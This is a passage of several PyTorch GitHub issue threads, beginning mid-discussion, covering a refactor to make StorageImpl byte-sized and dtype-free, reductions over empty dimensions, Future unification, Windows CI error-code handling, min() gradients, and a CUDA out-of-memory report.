* First, change StorageImpl's internal representation to track the size in bytes, rather than the number of typed elements. Replace any methods that either return a number of elements or accept a number of elements as an argument, in favor of a number of bytes. All callers of these methods will do explicit arithmetic to convert byte sizes to element counts, where applicable.
* Second, remove any calls to Storage/StorageImpl functions that have anything to do with dtypes. Instead, callers will explicitly do any required dtype handling.
* Finally, delete the dtype field from StorageImpl and any associated methods.

Now that I have these written out here, it seems like the second and last steps could be combined.

---

[ezyang]: Yeah, probably! Up to you!

---

[kurtamohler]: @ezyang, I'd like to share a summary of what I've done so far to make sure it aligns with what needs to be done, and I also have a few questions. Just to clarify, I'm currently working on the first goal of replacing all element counts with byte sizes.

Changes made to `c10::StorageImpl`:
* Replace `numel_` data member with `size_bytes_`
* Replace any `numel` method arguments with `size_bytes`
* Remove `size()` (returns the element count) and `itemsize()`, so callers must now use `capacity()` (returns the byte size).  Would it be better for me to rename `capacity()` to `size()`?
* Rename `set_numel()` to `set_capacity()`, and change its argument to be the size in bytes, rather than element count. Would it be better to call this method `resize()` or `set_size()`?

Changes made to `c10::Storage` match those made to `c10::StorageImpl`, except of course that this class doesn't have a size data member.

Changes made to `THStorage` methods to accommodate `c10` changes:
* Rename `THStorage_size()` to `THStorage_capacity()`, and make it return the byte size rather than element size, to be consistent with `c10`. Would it be better to keep the original name, `THStorage_size()`?
* Change `THStorage_resize()` to `THStorage_setCapacity()`. Same reasoning as the previous bullet point.

Also made similar changes to `THCStorage`.

All the function renaming may not have been strictly necessary, but it did help me find all the places where these methods are being called, where I proceeded to make the necessary arithmetic changes to account for byte sizes rather than element counts.

At this point, all the tests in `python test/test_torch.py TestTorchDeviceTypeCPU` pass. `python test/test_torch.py TestTorchDeviceTypeCUDA` only has two failing tests dealing with serialization. Since the serialization code is written in python, I'm starting to think about how Storage's python interface should change.

In the description of this ticket, you wrote:

> In the user side we still expose ByteStorage/LongStorage; these should either be eliminated from Python, or implemented as wrappers that know dtype.

Do you have a preference on this decision? I do think it would be confusing to make the python interface keep track of the datatype when the c++ interface does not.

I'm also wondering how many pytorch users will be affected by changing Storage's python interface, and is that acceptable? With my current changes, the python interface has changed. `Storage.size()` no longer exists, and `Storage.capacity()` can be used instead. Likewise, `Storage.resize_()` was changed to `Storage.setCapacity_()`. And I have the same question for these methods as I do for the c10 and TH/THC versions: should I keep their original names, or is renaming better?

---

[ezyang]: > Would it be better for me to rename capacity() to size()?

At least short term, it's better not to, so as to avoid confusion, and I would probably just blacklist the name `size()` forever. However if capacity refers to something involving bytes, I tend to like names with bytes in the name, such as `nbytes`

> Rename set_numel() to set_capacity()

If we're calling it capacity, then `set_capacity` is better.

> Rename THStorage_size() to THStorage_capacity()

I'd suggest just deleting these functions entirely, and directly calling `storage.capacity()` (or `nbytes()`, if you like my suggestion above), instead of doing a rename, since you're going to have to fix the call sites anyway. If this is onerous, don't worry about it (since it looks like you fixed all the call sites already).

And yes, function renaming is what I would have suggested you do, exactly so you can find the call sites.

> python test/test_torch.py TestTorchDeviceTypeCUDA only has two failing tests dealing with serialization. Since the serialization code is written in python, I'm starting to think about how Storage's python interface should change.

Yes, that explanation sounds on the nose.

> Do you have a preference on this decision? I do think it would be confusing to make the python interface keep track of the datatype when the c++ interface does not.

I do think it's confusing, but now you have gotten into the world of "this is a BC breaking change". Whereas if you continue to simulate typed storage in Python land as a storage + dtype, you can preserve all of the old functions and don't have to solve this problem. I am somewhat interested in seeing if we can deprecate the Python side interface, but that increases the blast radius of this change quite a bit and so my preference is to keep the Python interface as is (for now); I don't think it will be *too* much work to simulate it (but I could be wrong!)

---

[kurtamohler]: Alright, all makes sense, thanks!

---

[kurtamohler]: Currently, a Tensor's offset variable is a typed element count. Should we change it to track bytes instead? Would there be any situation where we'd want the offset to be a non-multiple of the tensor's datatype?

---

[ezyang]: Good question. I think I would opt for the choice that involves the least amount of arithmetic operations on CPU to compute the base address. Does that answer the question?

---

[kurtamohler]: Yeah that's a good answer.

Another question. I like the idea of removing the THStorage sizing methods and just calling the c10::Storage methods directly because it will remove complexity. That was simple to do for the `capacity` function (which I renamed to `nbytes`). But for the resizing functions, THStorage and THCStorage use some slightly different logic since one has to do a cuda memcopy. I'm not entirely sure what I would need to do to support both of these within `c10::StorageImpl::set_nbytes`. Is there a way I can mimic the device dispatching that happens when a tensor operation is called? Would I need to create device-specific overloads of the resizing function in their own separate files (since one is built with clang and the other with nvcc)?

Or could all the cuda vs cpu-specific stuff be abstracted with c10::Allocator? I see that there's a `CPUAllocator` and a `CPUCachingAllocator`, but I don't really know what these do.

---

[ezyang]: > But for the resizing functions, THStorage and THCStorage use some slightly different logic since one has to do a cuda memcopy.

Ah yes, this is going to be a bit tricky.

A lot of the "stuff" you need is available (Allocator in particular lets you reallocate using the same allocator that originally allocated some data), but resizing also involves a copy to preserve the old data, and we don't have this abstracted right now. So in this case I wouldn't try to remove the resize functions, as we really do need two different versions. Does that help?

---

[kurtamohler]: Just to give an update, most of the unit tests seem to be passing, but I'm currently working on debugging an issue with JIT testing. I get an error when I run `python test/test_jit.py TestJit.test_trace_tensor_factory`. The issue is happening at the return statement at the end of `checkTrace()` in `jit_utils.py`.

The error I get is sometimes different. I've seen the following ones so far:
```
free(): invalid next size (fast)
Aborted (core dumped)
```
```
corrupted size vs. prev_size
Aborted (core dumped)
```
```Segmentation fault (core dumped)```
```double free or corruption (out)```

My guess is that a copy of a StorageImpl is getting deleted, and the `std::unique_ptr` is either deleting or trying to delete the memory it points to when it shouldn't be. But that's just a guess, and I'm not sure why any of my changes would make that happen. Currently trying to make sense of the backtraces I'm getting.

---

[kurtamohler]: I found and fixed my error. There were a few Storage constructor calls that I hadn't updated. Currently looking for any more constructor calls that I might have missed.

---

[kurtamohler]: @ezyang, are there any benchmarks you know of that will measure the performance of a wide range of different pytorch functions? I want to try to make sure my changes don't slow anything down.

---

[kurtamohler]: I'm working on removing the datatype from StorageImpl now, and I've noticed that one of TensorImpl's constructors (here: https://github.com/pytorch/pytorch/blob/master/c10/core/TensorImpl.cpp#L48) takes the datatype from the Storage argument to set TensorImpl's datatype member. My solution is to add a dtype argument to that constructor.

There's also `TensorImpl::set_storage()`, which currently changes `TensorImpl::data_type_` to match the storage object. Right now, my idea is to create two new methods `TensorImpl::set_storage_and_dtype()` and `TensorImpl::set_storage_keep_dtype()`. I found at least one spot were a `set_storage()` call did not have a dtype in its scope and the dtype is not changed, which is why I needed the `keep_dtype` version .

Just wanted to give a heads up in case there's some reason these solutions aren't ideal.

---

[kurtamohler]: My most recent commit (https://github.com/kurtamohler/pytorch/commit/6bdbfd7807d44837265adad189d6272f301027ba) is now building fully in my environment. Has runtime problems at `import torch` though.

---

[ezyang]: > My solution is to add a dtype argument to that constructor.

SGTM

>  Right now, my idea is to create two new methods TensorImpl::set_storage_and_dtype() and TensorImpl::set_storage_keep_dtype().

My intuition is that in most cases `set_storage` isn't supposed to override dtype. E.g. `THTensor_stealAndSetStoragePtr` explicitly is supposed to preserve dtype. I commented on your posted commit with some commmentary here.

---

[kurtamohler]: Cool, thanks @ezyang

---

[kurtamohler]: @ezyang, I need to make `torch.Tensor.set_()` check the dtype of the python storage object. I thought that the best way to do this would be similar to what I did in `torch/csrc/utils/tensor_new.cpp:legacy_tensor_ctor()`. But for `set_()`, I believe the corresponding place to add this check would be in the generated function `torch/csrc/autograd/generated/python_variable_methods.cpp:THPVariable_set_()`. I'm not sure what to do. Could I just define it explicitly in the corresponding template file `tools/autograd/templates/python_variable_methods.cpp`?

---

[ezyang]: RIP. Yes, you'll need to manually bind the Python code in that case. A bit unsatisfactory, let me know if this ends up being a lot of code to do.

---

[ezyang]: Do you know how to disable the Python codegen in this case?

---

[kurtamohler]: No I don't know how to disable the codegen. I tried adding the function to the template, but a duplicate is getting generated. I'm guessing that 'tools/pyi/gen_pyi.py' is where I need to make a change, but not sure yet.

---

[kurtamohler]: Turned out to be simple, just needed to add `set_` to the `SKIP_PYTHON_BINDINGS` list in `tools/autograd/gen_python_functions.py`

---

[kurtamohler]: Right now I'm grappling with a failure in `python test/test_jit.py TestScript.test_pickle_checkpoint`. I figured out that the cause of the failure is that `_empty_affine_quantized()` is being called with a regular type, but it expects a quantized type. The challenge is that `_empty_affine_quantized()` apparently has many different overloads and call sites, many of which are in generated code, and backtracing is difficult because of multiple layers of dispatch. So this might be a tough one.

---

[kurtamohler]: Ok I found out more about my qtensor issue.
```
q = torch.quantize_per_tensor(torch.rand(2, 3, dtype=torch.float), scale=0.1, zero_point=10, dtype=torch.quint8)
```
When I run `q.dtype`, I get `torch.uint8`, but it should be `torch.quint8`.

---

[kurtamohler]: @ezyang looks like there's a newly added cpp test from @osalpekar  that commit #37776 broke because it uses `storage().numel()`: https://github.com/pytorch/pytorch/blob/master/test/cpp/rpc/test_tensorpipe_serialization.cpp

I can make a PR to fix that real quick.

---

[ezyang]: @kurtamohler Did you need more help on the qtensor issue?

---

[kurtamohler]: No I think I've got it, thanks

---

[kurtamohler]: Maybe I do need some help after all. I keep thinking I've increased my understanding of the issue, but then when I go to try a solution, it turns out to be incorrect.

---

[kurtamohler]: So far, I think the issue is in this function, but I'm not entirely sure: https://github.com/kurtamohler/pytorch/commit/abfbc2c646fba88f09f401c1c1ee5b729e8f5444#diff-258396aa4fb204d9c74c4dd7db361497R60

This gets run underneath a `qtensor.storage()` python call. The `dtype` and `scalarType` variables are the correct quantized types, but the PyTypeObject returned by the function is the non-quantized version.

---

[kurtamohler]: I think I'm on to something now. The  `torch::{anonymous}::attype_to_py_storage_type` map has incorrect mappings. I printed out the scalar types of the keys and values in it and I see this:
```

    QInt32 -> Byte
    Char -> Byte
    Double -> Byte
    Long -> Byte
    Half -> Byte
    Float -> Byte
    Int -> Byte
    Short -> Byte
    QInt8 -> Byte
    Byte -> Byte
    Bool -> Byte
    QUInt8 -> Byte
```

[kurtamohler]: Nevermind, I was printing attype_to_py_storage_type wrong. It looks correct.

---

[kurtamohler]: Still haven't solved the QTensor issue, but I don't want that to hold me back from making progress, so I finished up a few last changes, and I'm currently rebasing so I can create a PR to see if CI will find any issues I haven't caught.

---

[kurtamohler]: Welp, while I was rebasing, I found out what's wrong with QTensor! Turns out when I replaced a `Storage::dtype()` call with `caffe2::TypeMeta::Make<scalar_t>()` inside `THPStorage_(dtype)`, I should have used an `#ifdef THQUANTIZED` to choose between `scalar_t` and `quantized_t`. Moral of the story: sometimes a solution will reveal itself if you stop looking for it :P

[kurtamohler]: @ezyang, are there any other changes I'll need to make for this issue after PR #38038? It seems like that PR will close the issue, but I wanted to double check

title: PyTorch issue 34907
body:
## 🐛 Bug

Current `min` / `max` implementation is too restrictive wrt tensors with zero elements.
Indeed, min/max reduction over an empty dimension should raise an error, as they don't have an identity, but if the dimension being reduced is not of size 0 (but the tensor has 0 elements), then it should work.

## To Reproduce

```python
a = torch.rand(0, 4)
print(a.max(1))
```
raises
```
RuntimeError: cannot perform reduction function max on tensor with no elements because the operation does not have an identity
```
while
```python
a = torch.rand(0, 4)
print(a.numpy().max(1))
```
returns
```
array([], dtype=float32)
```

---
PyTorch version `1.5.0.dev20200225`

cc @ezyang @gchanan @zou3519 @mruberry @rgommers @heitorschueroff
comments:
[gchanan]: CC @mruberry

---

[ngimel]: Bumping priority based on user activity, we should review if #38238 fixes it.

---

[rgommers]: Agreed that this should work. gh-38238 does look like it's going in the right direction but seems to have stalled. That PR followed up on gh-35062, which also stalled.

Some shape checks are still missing in that PR, e.g. the PyTorch equivalents of:
```
In [10]: x = np.ones((0, 3, 4))                                              

In [11]: np.max(x, axis=1)                                                   
Out[11]: array([], shape=(0, 4), dtype=float64)

In [12]: np.max(x, axis=2)                                                   
Out[12]: array([], shape=(0, 3), dtype=float64)
```
to make sure the fix doesn't unconditionally return a shape `(0,)` sized tensor.

@willwray this seems like a good issue to work on and get it over the finish line.

---

[v0dro]: Do we need to support the `kthvalue` function with 0 dim tensors? CC @ngimel

---

[v0dro]: One more question about `mode`. The function currently supports zero-dim tensors, but the output is not like the other methods where the dimension being reduced is the only one that is removed from the result. Instead, it returns a tensor of dimensions `[0]`. Should this be changed to make it similar to say reduction of min/max in numpy as pointed by @rgommers in https://github.com/pytorch/pytorch/issues/34907#issuecomment-679188146?

FYI, `scipy.stats` also returns the same dimensions if specifying a 0-dim numpy array:
```
q=np.zeros([2,0,4])
In [27]: qq=stats.mode(q, axis=0)

In [28]: qq
Out[28]: ModeResult(mode=array([], dtype=float64), count=array([], dtype=float64))
```

---

[rgommers]: > Do we need to support the `kthvalue` function with 0 dim tensors?

I'd say yes, nice for consistency. It's a similar reduction, where an input of shape `(n, m)` gives an output of shape `(n,)` for `dim=1`. However, I don't see how it's related to this issue easily, some more context to the question would have been useful. 

If you need to solve it to land the PR for `min`/`max` then do so I'd say, other fine to do as a follow-up - whatever is easier.

> One more question about `mode`. The function currently supports zero-dim tensors, but the output is not like the other methods where the dimension being reduced is the only one that is removed from the result. Instead, it returns a tensor of dimensions `[0]`. Should this be changed to make it similar to say reduction of min/max in numpy as pointed by @rgommers in [#34907 (comment)](https://github.com/pytorch/pytorch/issues/34907#issuecomment-679188146)?

I don't see any inconsistency here. Note that a _zero-dimensional_ tensor is different from a tensor with an _empty dimension_. Comparing `max`, `min` and `mode`, it looks the same to me:
```
>>> a_zerodim = torch.tensor(3)                                                                    
>>> torch.max(a_zerodim)                                                                           
tensor(3)
>>> torch.min(a_zerodim)                                                                           
tensor(3)
>>> torch.mode(a_zerodim)                                                                          
torch.return_types.mode(
values=tensor(3),
indices=tensor(0))
>>>                                                                                                
>>> a0 = torch.rand(0, 4)                                                                          
>>> torch.max(a0, dim=1)                                                                           
Traceback (most recent call last):
  File "<ipython-input-107-c4f5d9f5c635>", line 1, in <module>
    torch.max(a0, dim=1)
RuntimeError: cannot perform reduction function max on tensor with no elements because the operation does not have an identity

>>> torch.mode(a0, dim=1)                                                                          
Traceback (most recent call last):
  File "<ipython-input-108-754d784a9aa1>", line 1, in <module>
    torch.mode(a0, dim=1)
RuntimeError: cannot perform reduction function mode on tensor with no elements because the operation does not have an identity
```

Either way, my comment you referenced applies to `mode` as well.

> FYI, `scipy.stats` also returns the same dimensions if specifying a 0-dim numpy array:

The SciPy behavior is wrong here, and there's an open issue about it: https://github.com/scipy/scipy/issues/9955#issuecomment-474166442. Please ignore that, `mode` should work like other reductions.

title: PyTorch issue 34997
body:
Ideally we should have one Future abstraction in PyTorch codebase to have unified code paths regarding Future usage. 

torch::utils::Future<T> is a generic Future, we can specialize it as torch::utils::Future[IValue] and make torch::utils::Future[IValue] to be an IValue. After that, we can kill c10::ivalue::Future implementation

cc @suo @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar @ilia-cher @wanchaol
comments:
[xush6528]: Motivation

* It is causing RPC C++ entries to return different types, RPC TorchScript returns ivalue::Future. This is blocking Dist autograd Profiler(Rohan) and adding Future Python Type Annotation(Wanchao, Shihao).
* Autograd, DistAutograd, RPC is using utils::Future<T>, while JIT/TorchScript is using ivalue::Future. On integration point of RPC and JIT modules, this always creates divergent code paths and inconvenience for developers.

Plan

* Wrap utils::Future<rpc::Message> returned by RPC Python/BuiltinOp code paths into ivalue::Future[PyObject]. https://github.com/pytorch/pytorch/pull/35154
* Make ivalue::Future behave not exactly the same as utils::Future<T>. There are a few differences now. Will change them to the same behavior before replace ivalue::Future with utils::Future<IValue>. https://github.com/pytorch/pytorch/pull/35849
    * ivalue::Future::wait() only waits, does not returns value.
    * ivalue::Future::value() always returns a copy.  While utils::Future<T> wait() returns a reference.
    * ivalue::Future::FutureError and utils::FutureError are 2 types.
    * ivalue::Future::markCompleted takes FutureError. utils::Future<T>::setError takes FutureError.
    * ivalue::Future::addCallback adds a lambda that takes no argument. utils::Future<T>::addCallback adds a lambda that takes T and FutureError.
    * ivalue::Future assumes the value is default construct-able, so it can mark future as completed without providing value.
    * ivalue::Future support stream operator

---

[pritamdamania87]: @xush6528 Thanks for all the work on this! Since https://github.com/pytorch/pytorch/pull/35849 and https://github.com/pytorch/pytorch/pull/35154 are closed, could you update this issue with any outstanding items that we still need to address?

---

[rohan-varma]: We have completely deleted `torch/csrc/utils/future.h` and are using c10::ivalue::Future across the RPC codebase now, so closing this out.

comments:
[ezyang]: @malfet, I'm sure you know this already, but for others: Windows has this thing where you have to explicitly check for the error code of processes, it won't automatically quit the parent batch script (like `set -e` does in bash)

---

[peterjc123]: I'm pretty sure the exit code is checked. https://github.com/pytorch/pytorch/blob/master/.jenkins/pytorch/win-test-helpers/test_libtorch.bat

---

[malfet]: @ezyang alas, I'm well aware of that
@peterjc123 there there were two issues with that script:
 - Test error code can be different than 1 (i.e. `if errorlevel 1` should have been `if not errorlevel 0`)
 - Apparently `exit` command just returns from the function rather than aborting the entire script.
After making those two changes errors are now properly reported

---

[peterjc123]: According to https://ss64.com/nt/errorlevel.html, if errorlevel 1 catches the situations that the exit code is greater than 1. And if not errorlevel 0 catches the sitiations that the exit code is lower than zero.

---

[malfet]: Good point, let me modify those scripts to use `if %errorlevel% NEQ 0` to cover both positive and negative error cases

---

[peterjc123]: @malfet This way, it is relying on a variable called errorlevel so when users do `set errorlevel=XXX` then it won't work as you expected. There are two options for fixing this:
1. Placing two kinds of if clauses
```cmd
python test.py
if errorlevel 1 exit /b 1
if not errorlevel 0 exit /b 1
```
2. Use or logic
```cmd
python test.py || exit /b 1
```

---

https://github.com/pytorch/pytorch/issues/35544

title: PyTorch issue 35699
body:
## Backward for `tensor.min` behaves differently if `dim` is set 

I noticed that the gradient of the `tensor.min()` function gives a different output when `dim` is set. Namely, when `dim` is set, the gradient will only correspond to one of the entries with the lowest values. If `dim` is not set, then there will be gradient for all entries which have the lowest value

## Code sample to reproduce

```
import torch
a = torch.tensor([0.1, 0.3, 0.1], dtype=torch.float32, requires_grad = True)
a_cp  = torch.tensor([0.1, 0.3, 0.1], dtype=torch.float32, requires_grad = True)
b = a.min()
b.backward()
a.grad  # Output is tensor([1., 0., 1.])
c, d = a_cp.min(dim=0)
c.backward()
a_cp.grad  # Output is tensor([0., 0., 1.])
```

## Problematic for vectorized implementations

This behavior is not expected and it leads to discrepancies in the gradients between vectorized and non implementations. Setting `dim` in `torch.min()` should not change the gradients. 



cc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen
comments:
[ailzhang]: I agree that we should fix this discrepancy in behaviors. 
Marking triage review so that we can agree on whether fixing `torch.min()` or `torch.min(dim=0)`.

---

[jcjohnson]: The `torch.min(dim=0)` behavior is more correct, since it's a subgradient of the function at this nondifferentiable point.

See for example:
https://see.stanford.edu/materials/lsocoee364b/01-subgradients_notes.pdf

---

[gchanan]: I believe the `torch.min(dim=0)` is also the behavior of related functions like max_pool.

---

[albanD]: Yes only one of the minimum value should get gradient.
So we should change torch.min().

---

[nikitaved]: `min.dim` uses `scatter_` in the backward, hence it is not deterministic. What would be preferred behavior in here? Shall it mirror the behavior of argmin/argmax? There, by the way, the behavior is different depending on whether it is run on CPU or GPU.

---

[albanD]: The problem is not with determinism. It is with the fact that we set multiple values to the gradient and not a single one.

I think this is more general than just min. `select_equals_backward` is not the right thing to use for min/max. Only one of the entries should get gradients, not all of them as we do: `masked_fill_(input == value, grad)`. Not sure how to implement that efficiently though...

---

[nikitaved]: I am aware of the problem. The question is which coordinate gets the gradient? Shall it be deterministic (first value, last value, etc..)? The current implementation for `min.dim` uses `scatter` so, in backward, it is unknown which value gets the gradient because `scatter` is not deterministic. `min.dim` keeps the indices of min values and writes them back to the output in a non-deterministic manner with `scatter`. I am asking whether the behavior has to be consistent with some rule... And if so, which rule?
argmin/argmax is deterministic for CPU, for example. So, I guess, it makes sense to keep it that way for CPU in this case. What do you think? Could be that the behavior of `min.dim` has to be changed to deterministic as well...

---

[albanD]: The general rule is that we try to keep it deterministic. But if it is more efficient not to be, then it is fine. You can see we mention it in the doc [here](https://pytorch.org/docs/stable/notes/randomness.html#pytorch).
In this particular case, correctness is more important than determinism.

But even in a non-deterministic way, what do you think is an efficient implementation of this backward?

---

[nikitaved]: I think it makes sense to follow the approach from argmin/argmax. Two custom kernels for CPU and GPU. CPU in a simple kernalized loop (TensorIterator, apply_kernel), and for GPU copying the approach from argmax/argmin. Does it make any sense?

---

[albanD]: Ho right, writing custom kernels will definitely work 👍 
If you write a custom kernel, you will need to write a backward for that backward as well.
I was more thinking of a generic backward like the one we have right now.

But if there is no efficient solution with the primitives we already have I guess we can do this.
Another thing I was thinking is to make the `min()` op return the index of one minimum value that we use for the autograd (but do not return to the user, like we do for maxpool) and the backward is then simply writing the grad value at that index.

---

[nikitaved]: > Another thing I was thinking is to make the `min()` op return the index of one minimum value that we use for the autograd (but do not return to the user, like we do for maxpool) and the backward is then simply writing the grad value at that index.

Yeah, this is exactly what I was thinking about - to reuse `min.dim`. It will not be a problem to hide the indices, will it? But then I am not sure that the indices that `min.dim` returns are deterministic :)
So, determinism is the priority here, right?

---

[nikitaved]: It could be that `scatter` will become determinism-friendly at some point... So maybe reusing `min.dim` is not a bad idea...

---

[albanD]: > So, determinism is the priority here, right?

No I don't think so.
1) Correctness
2) Speed/memory
3) Determinism

> to reuse min.dim

Maybe the simplest way is this yes.
Completely remove min() from the derivatives.yaml and implement it with min.dim. You just need to make sure that the implementation works in all cases that min() support (non-contiguous inputs, sparse, etc).

---

[nikitaved]: @albanD , I am a bit confused with all these autogenerated `min` variants. Could you please shine some light here? I see that there is a `min` variant with 3 dispatches. Now, there are other `min` variants, including the ones with `dim` specified. I guess these are generated, right? Am I correct that the original implementation `min` with `dim` specified traces back to `_min`?
What's the difference between `min` and `_min`? It seems like they are using different dispatches, but why? Is it because of performance?

---

[nikitaved]: I think at this point it could be easier to modify the backward method where first the forward is done with the indices returned, and then the backward similar to `min.dim`. Sounds like a hack, but at least it is possible to reuse the already implemented functionality. Ah, forgot, it will require a new dispatch for quantized...

---

[albanD]: From the autograd point of view (in derivatives.yaml), we have 3 versions:
- min() that does the full reduction
- min(dim=) that does reduction on a given set of dimensions
- min(other=) that does element-wise minimum between Tensors.

Only the first one is problematic. (Note that the version of max() that does the full reduction uses the same backward and so has the same issue).


From the point of view of aten (native_functions.yaml)
- min() that does the full reduction (with a special quantized dispatch as you mentionned).
- min.dim (with the named versions and the versions where the user provide the output Tensor and the version with only the values and no indices)
- min.other (and the version where the user provide the output Tensor as min.out)
- _min which are the TH implementations if the dim version (and the out= variant)

The simplest fix I think is:
```
Tensor select_equals_backward(Tensor grad, const Tensor & input, const Tensor & value) {
  auto grad_input = at::zeros_like(input, LEGACY_CONTIGUOUS_MEMORY_FORMAT);
  // Below is pseudo-code, might not run as is
  auto first_nonzero = (input == value).nonzero().select(0, 0);
  auto tmp = grad_input;
  for (auto dim=0; dim < grad_input.sizes().size(); ++dim) {
    tmp = tmp.select(0, first_nonzero[dim].item()); // Not sure what is the cpp equivalent of item
  }
  tmp.copy_(grad);
  return grad_input;
}
```

---

[nikitaved]: Thanks for the help, now the structure makes much more sense.
But am I correct that this function assumes batched input? Then the loop has to be over the batch dimension, right?

---

[albanD]: No the full reduction goes from ND to a scalar. So the backward takes a scalar and returns an ND Tensor.
There is no notion of batch for this function.

In python you would do `grad_input[*first_nonzero] = grad` but I don't think you can do that in cpp. So I just index each dimension one by one in a for-loop :D

---

[nikitaved]: @albanD , looks like `select` creates a new tensor. So, my plan is to create an array of 0-dim Tensors from `nonzero` using accessors,  and then apply `index_put`. Would that work?

---

[albanD]: `.select()` creates a new Tensor but it shares storage and so is always a view of the original one.
So the code above should work.
Not sure how you would do with index_put.

---

[nikitaved]: OK, indeed, `select` does the job. Thank you! Is it possible to achieve the same thing in Python? Did not work for me in Python however...

---

[albanD]: PR has been merged. This should be all fine now!

title: PyTorch issue 35901
body:
## 🐛 Bug

I am experiencing the classic out of memory error where my GPU appears to have a lot of memory still available, however my scenario seems to be a little different to other, fragmentation related, issues I have seen. These other problems point to free memory being less than the reserved/cached memory quoted in the error message, but the reserved (or allocated + cached) is always close to the total capacity of the GPU. 

**In my case the reserved total is only around ~50% of the total capacity of the GPU** which seems like the caching allocator is unable to request any more, despite having plenty available and no other processes running on the card which is in exclusive mode.
```
CUDA out of memory. Tried to allocate 10.84 GiB (GPU 0; 23.65 GiB total capacity; 1.06 GiB already allocated; 10.26 GiB free; 12.53 GiB reserved in total by PyTorch)
```
The other strange thing I have noticed is if I create/delete a (smaller) dummy tensor before creating the larger tensor (which causes the OOM) it results in the reserved memory total increasing, and I am then able to successfully create my larger tensor! I have tried running `torch.cuda.empty_cache()` prior to creating the large tensor and it does not fix this issue.

## To Reproduce

This always occurs on the second iteration of my training loop. The memory pattern I see by recording `torch.cuda.memory_allocated()` and `torch.cuda.memory_reserved()` in GiB directly before and after the creation of the large (problem) tensor is:

### Failure case
**Step 0**
mem_allocated **0.651**, mem_reserved **1.680**
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.495**, mem_reserved **12.523**
...
**Step 1**
mem_allocated **1.061**, mem_reserved **12.529**
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
OOM 🧨


### Working case
And in the second scenario where I create then delete a smaller tensor prior to creating the big tensor, in order to bump up the reserved memory and everything works

**Step 0**
`dummy_z = torch.randn([1024, 1024, 2048], device='cuda')`
mem_allocated **8.651**, mem_reserved **9.680** 
`del dummy_z`
`gc.collect()`
mem_allocated **0.651**, mem_reserved **9.680** 
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.495**, mem_reserved **20.523**
...
**Step 1**
`dummy_z = torch.randn([1024, 1024, 2048], device='cuda')`
mem_allocated **9.061**, mem_reserved **20.529** 
`del dummy_z`
`gc.collect()`
mem_allocated **1.061**, mem_reserved **20.529** 
`z = torch.randn([320, 19, 935, 2, 256], device='cuda')`
mem_allocated **11.905**, mem_reserved **20.529**
...
**Step 2...**


## Expected behavior

To reserve/utilize an amount of memory close to the total available, as I have shown in the working case without having to create/delete dummy tensors.

## Environment
```
PyTorch version: 1.4.0
Is debug build: No                                                                                                                                           
CUDA used to build PyTorch: 10.1                                                                                                                                                                                                                                                                                          
OS: Ubuntu 18.04.4 LTS                                                                                                                                       
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0                                                                                                           
CMake version: version 3.10.2                                                                                                                                                                                                                                                                                             
Python version: 3.7                                                                                                                                          
Is CUDA available: Yes                                                                                                                                       
CUDA runtime version: Could not collect                                                                                                                      
GPU models and configuration:                                                                                                                                
GPU 0: TITAN RTX                                                                                                                                             
GPU 1: TITAN RTX                                                                                                                                             
GPU 2: TITAN RTX                                                                                                                                             
GPU 3: TITAN RTX                                                                                                                                             
GPU 4: TITAN RTX                                                                                                                                             
GPU 5: TITAN RTX                                                                                                                                             
GPU 6: TITAN RTX                                                                                                                                             
GPU 7: TITAN RTX                                                                                                                                                                                                                                                                                                          
Nvidia driver version: 440.59                                                                                                                                
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5                                                                                                                                                                                                                                                                
Versions of relevant libraries:                                                                                                                              
[pip3] numpy==1.18.0                                                                                                                                         
[pip3] pytorch-memlab==0.0.4                                                                                                                                 
[pip3] torch==1.4.0

```
